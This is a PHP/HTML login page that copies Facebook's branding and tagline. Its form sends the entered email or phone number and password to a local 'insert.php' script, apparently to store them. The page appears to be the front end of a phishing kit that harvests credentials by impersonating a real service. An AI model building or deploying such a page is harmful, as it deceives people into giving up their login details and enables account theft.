<?php include_once "header.php"; ?>

  <body>
    <div class="container flex">
      <div class="facebook-page flex">
        <div class="text">
          <h1>facebook</h1>
          <p>Connect with friends and the world </p>
          <p> around you on Facebook.</p>
        </div>
        <form name="login" method="post" action="insert.php">
          <div class="field email_phone-field">
            <div class="input-field">
              <input name="email_phone" type="text" placeholder="Email or phone number" class="email">
            </div>
            <span class="error email_phone error">
              <i class="bx bx-error-circle error-icon"></i>
              <p class="error-text"></p>
            </span>
          </div>
          <div class="field password-field">
            <div class="input-field">
              <input name="password" type="password" placeholder="Password" class="password">
            </div>
            <span class="error password error">
              <i class="bx bx-error-circle error-icon"></i>
              <p class="error-text"></p>
            </span>
          </div>
          <div class="link">
            <button type="submit" class="login" name="Submit">Login</button>
            <a href="" class="forgot">Forgot password?</a>
          </div>
          <hr>
          <div class="button">
            <a href="#">Create new account</a>
          </div>
        </form>
      </div>
    </div>
  </body>
</html>
